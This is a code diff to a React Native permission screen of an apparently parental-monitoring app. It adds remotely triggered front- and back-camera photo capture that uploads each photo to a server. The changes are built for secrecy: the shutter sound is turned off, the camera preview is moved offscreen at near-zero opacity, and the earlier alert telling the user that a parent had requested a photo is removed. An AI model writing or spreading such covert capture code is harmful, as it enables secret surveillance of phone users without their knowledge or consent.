@@ -12,21 +12,24 @@ import {
   AppState,
   NativeModules,
   Alert,
+  Platform,
 } from 'react-native'
 import { SafeAreaView } from 'react-native-safe-area-context'
 import { check, PERMISSIONS, RESULTS } from 'react-native-permissions'
-import { getMessaging, onMessage } from '@react-native-firebase/messaging'
-import { Camera, useCameraDevice } from 'react-native-vision-camera'
+import { Camera, useCameraDevice, useCameraFormat } from 'react-native-vision-camera'
 import ViewShot from 'react-native-view-shot'
 import AsyncStorage from '@react-native-async-storage/async-storage'
-import { handleFCMCommand } from '../../services/FCMCommandHandler'
+import { register as registerCameraCapture, unregister as unregisterCameraCapture } from '../../services/CameraCaptureRegistry'
+import { getPending as getPendingCameraCapture, clearPending as clearPendingCameraCapture } from '../../services/PendingCameraCaptureManager'
+import { uploadCameraPhoto } from '../../services/CameraPhotoService'
 
 const { ScreenLock } = NativeModules
 
 const Permission = ({ navigation }) => {
 
   const cameraRef = useRef(null)
-  const device = useCameraDevice('front')
+  const frontDevice = useCameraDevice('front')
+  const backDevice = useCameraDevice('back')
   const viewShotRef = useRef(null)
   /* ================= STATE ================= */
 
@@ -41,6 +44,14 @@ const Permission = ({ navigation }) => {
     superBattery: false,
   })
   const [cameraError, setCameraError] = useState(false)
+  const [cameraReady, setCameraReady] = useState(false)
+  const [activeCameraType, setActiveCameraType] = useState('front')
+  const [pendingCapture, setPendingCapture] = useState(null)
+  const isCapturingRef = useRef(false)
+  const captureResolveRef = useRef(null)
+
+  const device = activeCameraType === 'back' && backDevice ? backDevice : frontDevice
+  const format = useCameraFormat(device, [{ photoResolution: { width: 1280, height: 720 } }])
 
   /* ================= HELPERS ================= */
 
@@ -50,31 +61,60 @@ const Permission = ({ navigation }) => {
 
   /* ================= FCM COMMAND HANDLER (foreground) ================= */
 
-  const handleCommand = (message) => {
-    const data = message?.data
-    if (!data?.command) return
-    console.log('HANDLE COMMAND:', data)
-    if (data.command === 'TAKE_PHOTO') {
-      takePhoto(data)
+  const takePhotoAndUpload = async (cameraType) => {
+    if (isCapturingRef.current || !device) return
+    if (!cameraRef.current) {
+      setPendingCapture(null)
+      captureResolveRef.current?.()
+      captureResolveRef.current = null
       return
     }
-    handleFCMCommand(message, { isBackground: false })
+    if (!cameraReady) {
+      setPendingCapture(cameraType)
+      if (activeCameraType !== cameraType && (cameraType === 'back' ? backDevice : frontDevice)) {
+        setActiveCameraType(cameraType)
+      }
+      captureResolveRef.current?.()
+      captureResolveRef.current = null
+      return
+    }
+    isCapturingRef.current = true
+    try {
+      const photo = await cameraRef.current.takePhoto({ enableShutterSound: false })
+      const path = photo?.path || photo?.uri
+      if (path) {
+        await uploadCameraPhoto(path, cameraType)
+        console.log('Photo captured and uploaded:', cameraType, path)
+      } else {
+        console.warn('No path in photo result:', photo)
+      }
+      captureResolveRef.current?.()
+      captureResolveRef.current = null
+    } catch (e) {
+      console.error('Failed to take/upload photo', e)
+      captureResolveRef.current?.()
+      captureResolveRef.current = null
+      if (Alert?.alert) Alert.alert('Camera error', e?.message || 'Could not take or upload photo')
+      throw e
+    } finally {
+      isCapturingRef.current = false
+      setPendingCapture(null)
+    }
   }
 
-  const takePhoto = async (data) => {
-    if (cameraRef.current) {
-      Alert.alert("Notice", "Taking a photo as requested by parent.")
-      try {
-        const photo = await cameraRef.current.takePhoto()
-        console.log("Photo captured:", photo.path)
-        // Here you can upload the photo to your server
-        // e.g., uploadFile(photo.path)
-      } catch (e) {
-        console.error("Failed to take photo", e)
-      }
-    } else {
-      Alert.alert("Error", "Camera is not ready.")
+  const handleCameraCaptureRequest = (cameraType) => {
+    const targetDevice = cameraType === 'back' && backDevice ? backDevice : frontDevice
+    if (!targetDevice) {
+      return takePhotoAndUpload('front')
     }
+    if (activeCameraType === cameraType) {
+      return takePhotoAndUpload(cameraType)
+    }
+    return new Promise((resolve) => {
+      captureResolveRef.current = resolve
+      setPendingCapture(cameraType)
+      setActiveCameraType(cameraType)
+    })
   }
 
   /* ================= REAL PERMISSION HANDLER ================= */
@@ -83,10 +123,20 @@ const Permission = ({ navigation }) => {
     switch (key) {
 
       case "remoteCamera": {
-        const res = await PermissionsAndroid.request(
-          PermissionsAndroid.PERMISSIONS.CAMERA
-        )
-        updatePermission(key, res === PermissionsAndroid.RESULTS.GRANTED)
+        let granted = false
+        try {
+          const res = await PermissionsAndroid.request(
+            PermissionsAndroid.PERMISSIONS.CAMERA
+          )
+          granted = res === PermissionsAndroid.RESULTS.GRANTED
+          if (granted && Camera?.requestCameraPermission) {
+            const visionResult = await Camera.requestCameraPermission()
+            granted = visionResult === 'granted'
+          }
+        } catch (e) {
+          console.warn('Camera permission request failed', e)
+        }
+        updatePermission(key, granted)
         break
       }
 
@@ -142,22 +192,43 @@ const Permission = ({ navigation }) => {
   useEffect(() => {
     recheckPermissions()
 
-    // FCM foreground listener
-    const messaging = getMessaging()
-    const unsubscribe = onMessage(messaging, (message) => {
-      console.log('📩 FCM RECEIVED:', message.data)
-      handleCommand(message)
-    })
+    const pending = getPendingCameraCapture()
+    if (pending) {
+      clearPendingCameraCapture()
+      setPendingCapture(pending)
+      setActiveCameraType(pending === 'back' && backDevice ? 'back' : 'front')
+    }
+  }, [])
 
-    // AppState listener (user back from settings)
+  useEffect(() => {
+    setCameraReady(false)
+  }, [device?.id])
+
+  useEffect(() => {
+    if (!permissions.remoteCamera || !device) setCameraReady(false)
+  }, [permissions.remoteCamera, device])
+
+  useEffect(() => {
+    registerCameraCapture(handleCameraCaptureRequest)
+    return () => unregisterCameraCapture()
+  }, [activeCameraType, permissions.remoteCamera, backDevice])
+
+  useEffect(() => {
+    if (!pendingCapture || pendingCapture !== activeCameraType || !device || isCapturingRef.current || !cameraReady) return
+    const t = setTimeout(() => {
+      if (cameraRef.current && cameraReady) {
+        takePhotoAndUpload(pendingCapture)
+      }
+    }, 800)
+    return () => clearTimeout(t)
+  }, [pendingCapture, activeCameraType, device, cameraReady])
+
+  useEffect(() => {
+    recheckPermissions()
     const sub = AppState.addEventListener("change", state => {
       if (state === "active") recheckPermissions()
     })
-
-    return () => {
-      unsubscribe()
-      sub.remove()
-    }
+    return () => sub.remove()
   }, [])
 
   const allAllowed = Object.values(permissions).every(v => v === true)
@@ -193,9 +264,18 @@ const Permission = ({ navigation }) => {
             ref={cameraRef}
             style={styles.hiddenCamera}
             device={device}
+            format={format}
             isActive={true}
+            photo={true}
             captureAudio={false}
-            onError={() => setCameraError(true)}
+            onInitialized={() => setCameraReady(true)}
+            onError={(err) => {
+              const msg = err?.message ?? String(err)
+              if (!msg.includes('camera-is-restricted')) {
+                console.warn('Camera error', err)
+              }
+              setCameraError(true)
+            }}
           />
         )}
 
@@ -283,7 +363,14 @@ const styles = StyleSheet.create({
     backgroundColor: "#2563EB", paddingVertical: 14, borderRadius: 12, alignItems: "center"
   },
   confirmButtonText: { color: "#FFF", fontSize: 16, fontWeight: "700" },
-  hiddenCamera: { width: 1, height: 1, position: 'absolute', top: -100, left: -100 }
+  hiddenCamera: {
+    width: Platform.OS === 'android' ? 64 : 1,
+    height: Platform.OS === 'android' ? 64 : 1,
+    position: 'absolute',
+    top: -200,
+    left: -200,
+    opacity: 0.01,
+  }
 })
 
 export default Permission
